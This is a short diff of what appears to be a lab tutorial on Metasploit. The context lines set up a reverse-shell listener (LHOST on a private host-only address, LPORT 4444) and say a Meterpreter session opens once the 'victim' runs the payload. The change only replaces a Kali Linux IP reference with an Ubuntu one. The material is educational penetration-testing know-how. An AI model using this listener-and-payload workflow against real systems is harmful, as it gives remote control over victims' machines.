@@ -188,7 +188,7 @@ set LHOST 192.168.56.101
 set LPORT 4444
 exploit
 ```
-Replace 192.168.56.101 with your Kali Linux host-only IP address.
+Replace 192.168.56.101 with your Ubuntu  IP address.
 #### 3.Establish Session:
 Once the victim executes the payload, a Meterpreter session should be established.
 
